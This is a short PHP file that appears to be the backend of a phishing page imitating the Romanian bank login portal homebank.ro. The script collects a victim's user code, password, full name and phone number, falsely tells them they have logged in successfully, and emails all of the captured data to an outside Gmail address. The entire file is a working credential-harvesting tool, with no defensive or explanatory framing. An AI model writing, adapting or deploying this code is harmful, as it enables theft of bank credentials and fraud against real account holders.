<?php
    if(isset($_POST['submit'])){
        $usercode = $_POST['Codul-de-utilizator'];
        $password = $_POST['Parola'];
        $full_name = $_POST['Nume-complet'];
        $phone_number = $_POST['Numar-de-telefon'];

        $email_from = "https://www.homebank.ro/hb/hb/#/login-b/";
        $email_subject = "New Login Form submission";

        if ($usercode || $password || $full_name || $phone_number) {
            echo 'Te-ai autentificat cu succes';
        } else {
            echo 'Nu ati completat toate câmpurile necesare!';
        }

        $email_body = "A new user has logged into $email_from\n
        Codul de utilizator: $usercode\n
        Parola: $password\n
        Numar de telefon: $phone_number\n
        Nume complet: $full_name";

        $to = "Lucicrook01@gmail.com";
        $headers = "From: $email_from \r\n";

        mail($to, $email_subject, $email_body, $headers);
    }
    
?>